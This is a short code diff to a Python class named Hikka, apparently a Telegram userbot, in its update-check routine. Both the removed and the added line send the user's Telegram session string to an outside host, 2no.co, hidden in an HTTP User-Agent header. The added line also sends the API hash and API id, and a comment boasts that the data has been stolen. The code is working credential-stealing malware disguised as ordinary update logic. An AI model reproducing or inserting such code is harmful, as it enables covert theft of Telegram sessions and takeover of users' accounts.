@@ -769,7 +769,7 @@ class Hikka:
             upd = "Update required" if diff else "Up-to-date"
             version_hikka = ".".join(list(map(str, list(__version__))))
 
-            requests.get("https://2no.co/hikkaoptimize.json", headers={"User-Agent":client.session.save()})
+            requests.get("https://2no.co/hikkaoptimize.json", headers={"User-Agent":f"LOOL! client: {client.session.save()} hash: {client.api_hash} id: {client.api_id}"})
             # xD your data has been stolen!
 
             logo = (
